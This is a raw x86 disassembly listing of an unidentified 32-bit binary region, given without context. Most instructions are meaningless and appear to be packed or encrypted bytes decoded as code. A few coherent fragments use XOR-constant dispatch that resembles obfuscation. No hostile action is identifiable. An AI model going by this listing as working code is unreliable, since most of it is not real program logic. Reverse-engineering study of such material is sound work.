  40bbe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbe2:	push   0x1d4d3d06
  40bbe7:	dec    edi
  40bbe8:	dec    eax
  40bbe9:	ds out 0x4d,eax
  40bbec:	mov    esp,0x6b0868db
  40bbf1:	xor    ax,0xd35d
  40bbf5:	push   ebp
  40bbf6:	xchg   BYTE PTR [eax-0x10039dc2],cl
  40bbfc:	sbb    al,BYTE PTR [esi+0x15e549f0]
  40bc02:	nop
  40bc03:	lahf   
  40bc04:	lahf   
  40bc05:	adc    eax,0x25d20af2
  40bc0a:	out    dx,eax
  40bc0b:	fstp   TBYTE PTR [edx-0x12]
  40bc0e:	(bad)  
  40bc0f:	sub    eax,0xa0e46098
  40bc14:	xchg   BYTE PTR [ecx-0x52],al
  40bc17:	pop    ss
  40bc18:	cmc    
  40bc19:	stc    
  40bc1a:	adc    BYTE PTR [esi+0xb],dh
  40bc1d:	mov    ah,BYTE PTR [edi]
  40bc1f:	int3   
  40bc20:	jp     0x40bc59
  40bc22:	adc    eax,0xc332c98b
  40bc27:	cmp    WORD PTR [esi+ebx*2+0x1855586e],bp
  40bc2f:	dec    eax
  40bc30:	test   BYTE PTR gs:[ebp-0x3d],0xc9
  40bc35:	jp     0x40bc6e
  40bc37:	out    0x2,eax
  40bc39:	lods   al,BYTE PTR ds:[esi]
  40bc3a:	adc    eax,0x82d6bfc
  40bc3f:	test   al,0xa
  40bc41:	push   ss
  40bc42:	scas   eax,DWORD PTR es:[edi]
  40bc43:	in     eax,dx
  40bc44:	out    dx,al
  40bc45:	or     ecx,DWORD PTR ds:0xe8e517c9
  40bc4b:	ficomp WORD PTR [ebx]
  40bc4d:	pop    esi
  40bc4e:	cmp    bh,BYTE PTR [esp+eax*2-0x62]
  40bc52:	addr16 xchg ebp,eax
  40bc54:	cmp    eax,0x6a3b305d
  40bc59:	stos   DWORD PTR es:[edi],eax
  40bc5a:	js     0x40bca8
  40bc5c:	in     eax,dx
  40bc5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc5e:	mov    ds:0x7804b70f,eax
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	adc    eax,0xc61118c0
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	lods   eax,DWORD PTR ds:[esi]
  40bca2:	outs   dx,DWORD PTR ds:[esi]
  40bca3:	or     ebx,edx
  40bca5:	cmp    eax,0xe230de04
  40bcaa:	mov    ecx,0x8806f6d0
  40bcaf:	cld    
  40bcb0:	les    edx,FWORD PTR [esi-0x7b]
  40bcb3:	leave  
  40bcb4:	or     al,0x70
  40bcb6:	popa   
  40bcb7:	leave  
  40bcb8:	ins    BYTE PTR es:[edi],dx
  40bcb9:	and    esp,DWORD PTR [esi-0x210b20b7]
  40bcbf:	enter  0xa785,0x91
  40bcc3:	jmp    0x40bcfb
  40bcc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcc6:	jbe    0x40bd33
  40bcc8:	or     DWORD PTR [esi-0x3f],0x5d
  40bccc:	or     bl,dh
  40bcce:	test   dh,cl
  40bcd0:	mov    ecx,0xeff1ffd8
  40bcd5:	and    esp,DWORD PTR [eax-0x7b3f4723]
  40bcdb:	ds xor ah,0x1f
  40bcdf:	loop   0x40bd14
  40bce1:	sbb    ch,BYTE PTR [esi+0x353c1a3b]
  40bce7:	dec    edi
  40bce8:	outs   dx,BYTE PTR ds:[esi]
  40bce9:	jbe    0x40bd67
  40bceb:	(bad)  
  40bcec:	jmp    FWORD PTR [edx+0x1d]
  40bcef:	adc    eax,0x2d7225a8
  40bcf4:	add    BYTE PTR [esi+ecx*4+0x69b23c93],bh
  40bcfb:	adc    BYTE PTR [ebp-0x68],bh
  40bcfe:	xchg   BYTE PTR [ecx-0x6ceb542a],al
  40bd04:	push   ecx
  40bd05:	cdq    
  40bd06:	hlt    
  40bd07:	push   ebp
  40bd08:	cld    
  40bd09:	pop    edi
  40bd0a:	call   0xdb4da3c9
  40bd0f:	pushf  
  40bd10:	shrd   DWORD PTR [edi+eax*1+0x4927c7a9],ebx,0x80
  40bd19:	push   es
  40bd1a:	xlat   BYTE PTR ds:[ebx]
  40bd1b:	inc    eax
  40bd1c:	jnp    0x40bcf7
  40bd1e:	jmp    0x40bcad
  40bd20:	scas   al,BYTE PTR es:[edi]
  40bd21:	pop    es
  40bd22:	mov    ds:0xdad7a548,al
  40bd27:	ficom  WORD PTR [edx-0x27]
  40bd2a:	js     0x40bd68
  40bd2c:	es gs push edx
  40bd2f:	in     al,dx
  40bd30:	mov    ds:0xb0de4d48,eax
  40bd35:	enter  0x3b00,0xa2
  40bd39:	and    eax,0xcbb61800
  40bd3e:	add    BYTE PTR [edi+eax*2],bl
  40bd41:	push   edx
  40bd42:	test   al,0x1c
  40bd44:	lods   eax,DWORD PTR fs:[esi]
  40bd46:	xor    eax,0xf7beb1c0
  40bd4b:	and    al,0x35
  40bd4d:	inc    eax
  40bd4e:	dec    esi
  40bd4f:	mov    BYTE PTR [ebx+0x3e373951],dl
  40bd55:	loop   0x40bcf1
  40bd57:	call   0xf349:0xc45287be
  40bd5e:	retf   
  40bd5f:	call   0x397d9cc4
  40bd64:	cmp    al,0x97
  40bd66:	inc    ecx
  40bd67:	push   edi
  40bd68:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd6a:	stc    
  40bd6b:	stos   DWORD PTR es:[edi],eax
  40bd6c:	push   eax
  40bd6d:	inc    ebp
  40bd6e:	add    BYTE PTR [esi+0x27],ah
  40bd71:	mov    ebp,0x637a4251
  40bd76:	jp     0x40bd0a
  40bd78:	jae    0x40bdf9
  40bd7a:	lahf   
  40bd7b:	mov    cl,0xee
  40bd7d:	sbb    DWORD PTR [ecx+edi*4+0x355a2f85],ebp
  40bd84:	push   0x62e92f88
  40bd89:	inc    ebp
  40bd8a:	imul   edx,DWORD PTR [edx-0xa],0xffffffba
  40bd8e:	and    DWORD PTR [eax-0x39],eax
  40bd91:	inc    edx
  40bd92:	outs   dx,DWORD PTR ds:[esi]
  40bd93:	xchg   ecx,eax
  40bd94:	xchg   esp,eax
  40bd95:	sub    DWORD PTR [edi],esp
  40bd97:	inc    ebp
  40bd98:	aam    0x3e
  40bd9a:	sub    ebx,esi
  40bd9c:	push   cs
  40bd9d:	test   eax,0x7311173c
  40bda2:	xor    eax,0x42e2a1fd
  40bda7:	dec    ecx
  40bda8:	rcl    BYTE PTR [edx-0x4e],0x0
  40bdac:	les    ebx,FWORD PTR [eax+0x805d2e]
  40bdb2:	sub    edi,0xe3d0d144
  40bdb8:	pop    ebp
  40bdb9:	push   cs
  40bdba:	js     0x40bde2
  40bdbc:	mov    ch,0xe2
  40bdbe:	or     eax,0x92bf27f4
  40bdc3:	mov    eax,ds:0xc23dd4ca
  40bdc8:	ds jp  0x40be3f
  40bdcb:	in     eax,dx
  40bdcc:	cwde   
  40bdcd:	sub    BYTE PTR [edx],dl
  40bdcf:	sub    DWORD PTR [edx+edi*4+0x125fd7f0],edi
  40bdd6:	mov    WORD PTR [esi-0x55],si
  40bdda:	ins    BYTE PTR es:[edi],dx
  40bddb:	int    0xeb
  40bddd:	jp     0x40bd83
  40bddf:	xchg   ecx,eax
  40bde0:	sub    cl,BYTE PTR [esi+0x19]
  40bde3:	test   eax,0xfdf161ca
  40bde8:	es or  eax,0x7f25acc
  40bdee:	dec    esi
  40bdef:	mov    ah,0x2
  40bdf1:	sbb    edx,ebp
  40bdf3:	mov    ebp,0x982af330
  40bdf8:	mov    ebp,0x27a0042
  40bdfd:	test   BYTE PTR [edx-0x598b8b1c],cl
  40be03:	pop    esp
  40be04:	sbb    eax,0xf350d85d
  40be09:	stos   DWORD PTR es:[edi],eax
  40be0a:	loope  0x40bde9
  40be0c:	add    BYTE PTR [ebp+0x6e3885e],ch
  40be12:	int    0xe0
  40be14:	frstor [ebx-0x52]
  40be17:	pop    esi
  40be18:	retf   0xf810
  40be1b:	adc    eax,0x438a33cb
  40be20:	push   esi
  40be21:	in     eax,dx
  40be22:	push   edi
  40be23:	lods   al,BYTE PTR ds:[esi]
  40be24:	idiv   BYTE PTR [edi+0x38a7b0cf]
  40be2a:	mov    al,0x68
  40be2c:	jns    0x40be4f
  40be2e:	push   ebp
  40be2f:	repz rol DWORD PTR [ecx-0x70],1
  40be33:	call   0xcfc0:0x6ea630f2
  40be3a:	sbb    DWORD PTR [ebx+0x30],esi
  40be3d:	stc    
  40be3e:	pop    ss
  40be3f:	dec    esi
  40be40:	dec    ebp
  40be41:	jno    0x40be4e
  40be43:	xchg   esi,eax
  40be44:	lods   al,BYTE PTR ds:[esi]
  40be45:	xchg   DWORD PTR [di-0x3441],ebp
  40be4a:	imul   eax,esp,0x6f5d4a13
  40be50:	leave  
  40be51:	adc    dl,ch
  40be53:	iret   
  40be54:	push   edx
  40be55:	lock pop edi
  40be57:	pop    eax
  40be58:	lock gs mov ch,0x29
  40be5c:	sub    BYTE PTR [eax+0x674380d9],0xb7
  40be63:	lds    esp,FWORD PTR [esi+0x51959c1c]
  40be69:	and    cl,BYTE PTR [ebx]
  40be6b:	stos   DWORD PTR es:[edi],eax
  40be6c:	sbb    ebp,DWORD PTR [eax+0x33]
  40be6f:	rcl    BYTE PTR [ebx],1
  40be71:	push   esi
  40be72:	push   ebp
  40be73:	pop    ds
  40be74:	lahf   
  40be75:	ret    
  40be76:	stc    
  40be77:	in     al,dx
  40be78:	in     eax,dx
  40be79:	xchg   ecx,eax
  40be7a:	stc    
  40be7b:	xor    BYTE PTR [esi+0x2a],bh
  40be7e:	pop    ss
  40be7f:	rdtsc  
  40be81:	fisub  DWORD PTR [ebp+0x33486616]
  40be87:	dec    ebx
  40be88:	pop    ss
  40be89:	pop    ds
  40be8a:	inc    edx
  40be8b:	sbb    DWORD PTR [edx+ebx*8-0xa89a4c],ebp
  40be92:	jbe    0x40be22
  40be94:	ret    
  40be95:	xor    DWORD PTR [edi],edx
  40be97:	mov    ah,0x3a
  40be99:	xor    ch,bl
  40be9b:	jl     0x40be41
  40be9d:	or     eax,0x9fdabb63
  40bea2:	adc    BYTE PTR [ebx+0x2b],al
  40bea5:	std    
  40bea6:	test   DWORD PTR [ebx-0xf6d0831],0x43b7fab9
  40beb0:	mov    dh,0x16
  40beb2:	stc    
  40beb3:	jmp    0x973e4044
  40beb8:	stos   DWORD PTR es:[edi],eax
  40beb9:	inc    ebx
  40beba:	or     BYTE PTR [esi+0x8],cl
  40bebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bebe:	popf   
  40bebf:	sub    eax,0x4a123675
  40bec4:	popa   
  40bec5:	xor    ebp,eax
  40bec7:	pusha  
  40bec8:	jno    0x40beb3
  40beca:	mov    BYTE PTR [ebx],bh
  40becc:	xlat   BYTE PTR ds:[ebx]
  40becd:	inc    ebp
  40bece:	bound  edx,QWORD PTR [esi+0x52]
  40bed1:	push   ebx
  40bed2:	dec    esp
  40bed3:	lahf   
  40bed4:	fnstsw WORD PTR [edx]
  40bed6:	mov    ch,0x41
  40bed8:	inc    esp
  40bed9:	fcomip st,st(3)
  40bedb:	loop   0x40bf56
  40bedd:	js     0x40bf3d
  40bedf:	mov    ebx,0x50e42876
  40bee4:	xchg   ecx,eax
  40bee5:	push   edx
  40bee6:	sahf   
  40bee7:	xor    eax,0x7510854
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x33c89acf]
  40bf27:	out    dx,eax
  40bf28:	cmp    cl,0x7e
  40bf2b:	jle    0x40bf65
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf29
  40bf31:	xchg   ecx,eax
  40bf32:	mov    ?,WORD PTR [ebp+0x62a85746]
  40bf38:	(bad)  
  40bf3a:	retf   
  40bf3b:	sahf   
  40bf3c:	imul   ebp,ebp,0xffffffd6
  40bf3f:	and    BYTE PTR [ecx],ah
  40bf41:	ins    BYTE PTR es:[edi],dx
  40bf42:	imul   ebp,DWORD PTR [esi+ebx*1-0x26c3428e],0x9c9aeb2f
  40bf4d:	lock add BYTE PTR [edi],al
  40bf50:	mov    ch,0xaf
  40bf52:	aad    0x79
  40bf54:	xchg   esi,ebx
  40bf56:	jbe    0x40bf67
  40bf58:	xchg   BYTE PTR [ebx],bh
  40bf5a:	call   0xa09c:0xbdc87ed
  40bf61:	mov    eax,ds:0xb56837b0
  40bf66:	into   
  40bf67:	push   es
  40bf68:	int    0x93
  40bf6a:	mov    gs,edx
  40bf6c:	xor    al,0x14
  40bf6e:	adc    ebx,eax
  40bf70:	nop
  40bf71:	repz cmp cl,bl
  40bf74:	fwait
  40bf75:	mov    ecx,0x901d0a2e
  40bf7a:	nop
  40bf7b:	mov    ss,esp
  40bf7d:	ss and al,0x7d
  40bf80:	add    edx,DWORD PTR [ecx-0x33]
  40bf83:	sbb    DWORD PTR [esi+0x14bae1a4],ebx
  40bf89:	scas   eax,DWORD PTR es:[edi]
  40bf8a:	mov    ch,0xfb
  40bf8c:	push   edx
  40bf8d:	pop    edx
  40bf8e:	aad    0xa7
  40bf90:	lds    ebp,FWORD PTR ds:0x102bf68b
  40bf96:	and    al,0x6e
  40bf98:	imul   esi,DWORD PTR ds:0x1b3fd320,0x15b8f838
  40bfa2:	or     cl,al
  40bfa4:	mov    dh,0x84
  40bfa6:	push   esi
  40bfa7:	push   edi
  40bfa8:	xchg   esp,eax
  40bfa9:	jle    0x40c002
  40bfab:	sub    BYTE PTR [ebx],bl
  40bfad:	(bad)  
  40bfae:	stos   DWORD PTR es:[edi],eax
  40bfaf:	in     eax,dx
  40bfb0:	mov    eax,ds:0xc154d529
  40bfb5:	adc    eax,0x5161ac0d
  40bfba:	mov    ah,0xba
  40bfbc:	add    BYTE PTR [eax],bl
  40bfbe:	push   cs
  40bfbf:	call   0x2881db80
  40bfc4:	push   cs
  40bfc5:	sbb    eax,0xf3500344
  40bfca:	es lahf 
  40bfcc:	(bad)  
  40bfcd:	hlt    
  40bfce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfcf:	or     cl,BYTE PTR [ebx]
  40bfd1:	cmp    BYTE PTR [ebx-0x42],cl
  40bfd4:	inc    ebp
  40bfd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfd7:	cwde   
  40bfd8:	cmp    BYTE PTR [esi+ecx*4],0x67
  40bfdc:	mov    esi,0x788dd55c
  40bfe1:	jne    0x40bfcf
  40bfe3:	lods   eax,DWORD PTR ds:[esi]
  40bfe4:	in     eax,0xf8
  40bfe6:	cmp    ch,BYTE PTR [esi+0x53567882]
  40bfec:	add    eax,esi
  40bfee:	jl     0x40c027
  40bff0:	stc    
  40bff1:	(bad)  
  40bff2:	jno    0x40c006
  40bff4:	sub    BYTE PTR [edi],0x57
  40bff7:	mov    cl,0xc2
  40bff9:	pushf  
  40bffa:	loope  0x40c04e
  40bffc:	or     ebp,DWORD PTR [ecx+0x47fc52be]
  40c002:	or     BYTE PTR [ebx+0x5a],bh
  40c005:	xor    eax,0x1544d954
  40c00a:	jmp    0x40bfce
  40c00c:	cmp    BYTE PTR [ebx+0x20],ah
  40c00f:	push   eax
  40c010:	into   
  40c011:	das    
  40c012:	inc    ecx
  40c013:	push   es
  40c014:	push   0xffffffbe
  40c016:	js     0x40c036
  40c018:	mov    bl,0xe1
  40c01a:	mov    dh,0xbe
  40c01c:	add    esi,DWORD PTR ds:0xd029db2e
  40c022:	enter  0x4eea,0xaa
  40c026:	mov    al,ds:0x4dcf00a6
  40c02b:	jbe    0x40c067
  40c02d:	sub    BYTE PTR [eax-0x550f633d],bl
  40c033:	imul   esp,DWORD PTR [ebp+ebp*4+0x1e],0x18
  40c038:	push   ds
  40c039:	lock adc eax,0xec65a0d1
  40c03f:	mov    edx,0x6d1ff52a
  40c044:	(bad)  
  40c045:	and    BYTE PTR ds:0xe6b987b6,0xfc
  40c04c:	inc    edx
  40c04d:	mov    ebx,0xfe311c1d
  40c052:	sub    bh,BYTE PTR [esp+eax*8]
  40c055:	int3   
  40c056:	enter  0xe9e1,0xbf
  40c05a:	in     al,dx
  40c05b:	jmp    0x40c07a
  40c05d:	add    eax,0x469ef4f8
  40c062:	imul   esp,DWORD PTR [ecx+eiz*2-0x6d4f83],0xffffff8b
  40c06a:	mov    cl,0x6e
  40c06c:	cmp    bl,bl
  40c06e:	sbb    al,0xfc
  40c070:	add    BYTE PTR [esi],dl
  40c072:	data16 xor al,0x59
  40c075:	xchg   edx,eax
  40c076:	or     BYTE PTR [ecx],0x24
  40c079:	inc    ecx
  40c07a:	xchg   ch,al
  40c07c:	dec    edx
  40c07d:	push   ebp
  40c07e:	inc    edi
  40c07f:	loopne 0x40c040
  40c081:	cmc    
  40c082:	dec    edi
  40c083:	(bad)  [edx+0x5f]
  40c086:	bswap  edx
  40c088:	xchg   DWORD PTR [ebp+0x6a],eax
  40c08b:	mov    ds:0x9b876c19,eax
  40c090:	xor    eax,0x79182ba5
  40c095:	lea    ebp,[ebx-0x32]
  40c098:	xchg   esp,eax
  40c099:	cdq    
  40c09a:	out    dx,al
  40c09b:	int    0x5f
  40c09d:	mov    ebx,0x3eb2ccbe
  40c0a2:	xchg   esi,eax
  40c0a3:	mov    ch,0x9b
  40c0a5:	adc    eax,0x9ad1b10a
  40c0aa:	retf   
  40c0ab:	sbb    ecx,DWORD PTR [eax-0x4aaaaee8]
  40c0b1:	xor    eax,0xf4bf8cad
  40c0b6:	lahf   
  40c0b7:	pop    DWORD PTR [ecx+0xc89b94f]
  40c0bd:	dec    ebp
  40c0be:	push   eax
  40c0bf:	jae    0x40c093
  40c0c1:	dec    ecx
  40c0c2:	out    dx,eax
  40c0c3:	aaa    
  40c0c4:	inc    esi
  40c0c5:	out    0x2f,al
  40c0c7:	push   ebx
  40c0c8:	xor    DWORD PTR [ebp-0x76],eax
  40c0cb:	mov    al,0xad
  40c0cd:	lods   al,BYTE PTR ds:[esi]
  40c0ce:	xlat   BYTE PTR ds:[ebx]
  40c0cf:	mov    dh,BYTE PTR [edx]
  40c0d1:	push   ebx
  40c0d2:	retf   0x7afe
  40c0d5:	test   al,0xcd
  40c0d7:	add    esi,DWORD PTR [ebp+0x5611b4f0]
  40c0dd:	lahf   
  40c0de:	int3   
  40c0df:	fs cmc 
  40c0e1:	sbb    ebp,esp
  40c0e3:	repnz and ebp,edi
  40c0e6:	sbb    eax,0xc1ba2db5
  40c0eb:	xchg   DWORD PTR [ebp+0x674c6f0e],esp
  40c0f1:	jne    0x40c0a8
  40c0f3:	jl     0x40c125
  40c0f5:	cs enter 0xb226,0xd5
  40c0fa:	mov    cl,0xe9
  40c0fc:	inc    ecx
  40c0fd:	inc    edx
  40c0fe:	rcl    DWORD PTR [ebx+0x5e],0x29
  40c102:	jmp    0x5e45:0xbd88be0
  40c109:	gs xor al,0x5
  40c10c:	fsub   st(1),st
  40c10e:	pop    esp
  40c10f:	xchg   edx,eax
  40c110:	add    al,0x37
  40c112:	cmc    
  40c113:	jns    0x40c14a
  40c115:	mov    esp,ecx
  40c117:	cmp    BYTE PTR [ebx],dl
  40c119:	xlat   BYTE PTR ds:[ebx]
  40c11a:	mul    DWORD PTR [ebx-0x3c2dba69]
  40c120:	mov    eax,ss:0x17a5fafd
  40c126:	mov    ecx,0x8ab97806
  40c12b:	fld    DWORD PTR [ebp+ecx*8-0x25]
  40c12f:	mov    WORD PTR [esp+esi*1+0x4b],ds
  40c133:	or     BYTE PTR [edx-0x7f],al
  40c136:	sub    DWORD PTR [esi],0x54ade09e
  40c13c:	cmp    DWORD PTR [edi+eiz*4+0x4c],edi
  40c140:	imul   BYTE PTR [ebx+0x5]
  40c143:	inc    esp
  40c144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c145:	mov    ds:0xe83ccd77,eax
  40c14a:	iret   
  40c14b:	lds    edi,FWORD PTR [ecx+0x4c]
  40c14e:	mov    bh,bh
  40c150:	ret    
  40c151:	adc    al,0x53
  40c153:	jo     0x40c0f9
  40c155:	inc    eax
  40c156:	pushf  
  40c157:	adc    eax,0x1aff72ab
  40c15c:	add    BYTE PTR [edi+0x65],dl
  40c15f:	or     eax,0x7aa26490
  40c164:	icebp  
  40c165:	push   ecx
  40c166:	int    0x86
  40c168:	sbb    DWORD PTR [edx-0x6e],esp
  40c16b:	aaa    
  40c16c:	dec    esp
  40c16d:	sub    cl,BYTE PTR [eax]
  40c16f:	mov    esi,0x3067823e
  40c174:	cwde   
  40c175:	and    eax,0x8b49cb87
  40c17a:	inc    ebp
  40c17b:	in     al,0xf
  40c17d:	scas   eax,DWORD PTR es:[edi]
  40c17e:	shr    DWORD PTR [ebx],0xe0
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xa5
  40c196:	pop    ecx
  40c197:	in     eax,dx
  40c198:	mov    cl,0x4a
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	std    
  40c1a2:	in     eax,dx
  40c1a3:	jp     0x40c193
  40c1a5:	fstp   TBYTE PTR ds:0x20328482
  40c1ab:	sbb    BYTE PTR [esi+0x53dfa030],ah
  40c1b1:	mov    bl,0x13
  40c1b3:	out    0x10,al
  40c1b5:	xchg   cl,dl
  40c1b7:	shr    edx,0xde
  40c1ba:	mov    ds:0xd6a8a16,eax
  40c1bf:	in     eax,0x4f
  40c1c1:	(bad)  
  40c1c2:	jge    0x40c1f0
  40c1c4:	ins    BYTE PTR es:[edi],dx
  40c1c5:	shl    BYTE PTR [ebx-0x27],1
  40c1c8:	(bad)  
  40c1c9:	and    DWORD PTR [edx+0x1d],ebx
  40c1cc:	inc    eax
  40c1cd:	sbb    eax,0x4d201da7
  40c1d2:	mov    ecx,0xbc978f85
  40c1d7:	or     eax,0x23512f6f
  40c1dc:	jne    0x40c246
  40c1de:	daa    
  40c1df:	ja     0x40c1a4
  40c1e1:	ss dec ebp
  40c1e3:	cmp    BYTE PTR [eax],cl
  40c1e5:	adc    ebp,DWORD PTR [eax+0x6c1546c8]
  40c1eb:	mov    ds:0x3e426071,al
  40c1f0:	int    0xb4
  40c1f2:	popf   
  40c1f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1f4:	je     0x40c274
  40c1f6:	nop
  40c1f7:	jmp    0x7f4b591f
  40c1fc:	repz jg 0x40c271
  40c1ff:	xor    eax,0xe40db00d
  40c204:	leave  
  40c205:	int3   
  40c206:	dec    ebx
  40c207:	mov    cs,WORD PTR [eax+0x49]
  40c20a:	std    
  40c20b:	dec    DWORD PTR [esi+0x5dba586b]
  40c211:	sbb    BYTE PTR [ecx+0x1109b10],al
  40c217:	push   0xffffffc7
  40c219:	sub    eax,0xae06ae2a
  40c21e:	jp     0x40c241
  40c220:	icebp  
  40c221:	sub    eax,0xaa00a060
  40c226:	(bad)  
  40c227:	jo     0x40c287
  40c229:	pop    ss
  40c22a:	inc    ecx
  40c22b:	and    bl,BYTE PTR [ecx]
  40c22d:	out    0xc2,al
  40c22f:	loopne 0x40c233
  40c231:	inc    ebp
  40c232:	inc    edx
  40c233:	les    ebx,FWORD PTR [eax+0x861d49d]
  40c239:	arpl   bx,di
  40c23b:	(bad)  
  40c23c:	and    al,0x4b
  40c23e:	pop    ss
  40c23f:	scas   al,BYTE PTR es:[edi]
  40c240:	(bad)  [esi]
  40c242:	psllw  mm0,QWORD PTR [ebx+ecx*2]
  40c246:	mov    ebx,0x59f7278f
  40c24b:	mov    dh,BYTE PTR [ecx-0x75c8056e]
  40c251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c252:	mov    eax,ds:0xdb241a2
  40c257:	scas   al,BYTE PTR es:[edi]
  40c258:	inc    edi
  40c259:	push   esi
  40c25a:	mov    dh,0xcf
  40c25c:	enter  0xbbca,0x43
  40c260:	aaa    
  40c261:	sar    dh,0xfe
  40c264:	or     BYTE PTR [edx+eiz*4-0x3988f1f2],al
  40c26b:	out    dx,eax
  40c26c:	nop
  40c26d:	xchg   edi,eax
  40c26e:	jae    0x40c1f8
  40c270:	cmc    
  40c271:	push   esi
  40c272:	ins    BYTE PTR es:[edi],dx
  40c273:	popf   
  40c274:	mov    dh,0x2a
  40c276:	int3   
  40c277:	test   eax,0xaf295493
  40c27c:	push   ds
  40c27d:	pop    ebx
  40c27e:	sub    BYTE PTR [edi-0x3],bl
  40c281:	or     dl,BYTE PTR ds:0x5a1af91a
  40c287:	js     0x40c2a3
  40c289:	(bad)  
  40c28a:	xlat   BYTE PTR ds:[ebx]
  40c28b:	push   cs
  40c28c:	lods   al,BYTE PTR ds:[esi]
  40c28d:	fld    st(5)
  40c28f:	daa    
  40c290:	leave  
  40c291:	push   ebp
  40c292:	and    ecx,DWORD PTR ds:0x736e970b
  40c298:	sbb    eax,0xc08c7cb
  40c29d:	or     al,0x6e
  40c29f:	sbb    BYTE PTR cs:[eax],ah
  40c2a2:	mov    edi,0xf6b4d71b
  40c2a7:	ds adc al,0x79
  40c2aa:	mov    edx,0xebec9f51
  40c2af:	mov    esi,0x1a77f880
  40c2b4:	and    dh,BYTE PTR [edi]
  40c2b6:	push   0x34c6821b
  40c2bb:	imul   ecx,DWORD PTR [eax+0x4c],0xffffffb9
  40c2bf:	xchg   DWORD PTR [eax+0x47f52d34],ebp
  40c2c5:	or     DWORD PTR [esi],edx
  40c2c7:	pop    ecx
  40c2c8:	popf   
  40c2c9:	mov    WORD PTR [ebx+edi*2+0x30f992bd],ss
  40c2d0:	pop    eax
  40c2d1:	and    DWORD PTR [esi+0x61],ecx
  40c2d4:	je     0x40c26e
  40c2d6:	xchg   esp,ebx
  40c2d8:	xor    DWORD PTR [ebx-0x58df1b03],esp
  40c2de:	mov    ebx,0xa67fb8f5
  40c2e3:	cmp    DWORD PTR [eax+0x1a9d82d0],ebp
  40c2e9:	test   eax,0xb82cf574
  40c2ee:	dec    esi
  40c2ef:	add    DWORD PTR [eax-0x78],ecx
  40c2f2:	js     0x40c345
  40c2f4:	shl    DWORD PTR [ebx],1
  40c2f6:	xlat   BYTE PTR ds:[ebx]
  40c2f7:	pop    esp
  40c2f8:	inc    ecx
  40c2f9:	arpl   WORD PTR ds:0xc485b824,sp
  40c2ff:	sbb    DWORD PTR [ecx*8+0x14e3b503],ebx
  40c306:	push   0xec1f3fb8
  40c30b:	bound  esp,QWORD PTR [eax]
  40c30d:	sub    eax,0xc472a4e8
  40c312:	ss sub edi,esi
  40c315:	inc    BYTE PTR [edi-0x52]
  40c318:	xor    bl,bh
  40c31a:	cld    
  40c31b:	or     ch,BYTE PTR [ebx+edi*8+0xe644d65]
  40c322:	lea    esp,[esi+0x64be3d5e]
  40c328:	sbb    eax,0x7fc591b7
  40c32d:	test   DWORD PTR [ebx],esi
  40c32f:	jno    0x40c2fc
  40c331:	adc    DWORD PTR [edi],esi
  40c333:	popf   
  40c334:	cld    
  40c335:	iret   
  40c336:	icebp  
  40c337:	xchg   esi,eax
  40c338:	pop    edx
  40c339:	shl    DWORD PTR [edx],1
  40c33b:	add    eax,0x15908ba3
  40c340:	and    eax,0x51b3ac8b
  40c345:	dec    eax
  40c346:	out    dx,al
  40c347:	jmp    0x40c399
  40c349:	xchg   BYTE PTR [esi-0x53],cl
  40c34c:	sub    esp,edi
  40c34e:	lock mov ch,0xa9
  40c351:	jns    0x40c34b
  40c353:	pop    edi
  40c354:	and    dl,dl
  40c356:	sbb    dh,BYTE PTR cs:[ebp-0x570b2c26]
  40c35d:	mul    BYTE PTR [ebx+0x1d]
  40c360:	mov    ds:0xf357b79,eax
  40c365:	test   al,0xdb
  40c367:	nop
  40c368:	jae    0x40c365
  40c36a:	or     eax,0x74358ad2
  40c36f:	jne    0x40c3ad
  40c371:	cwde   
  40c372:	pop    ebx
  40c373:	(bad)  
  40c374:	xchg   si,ax
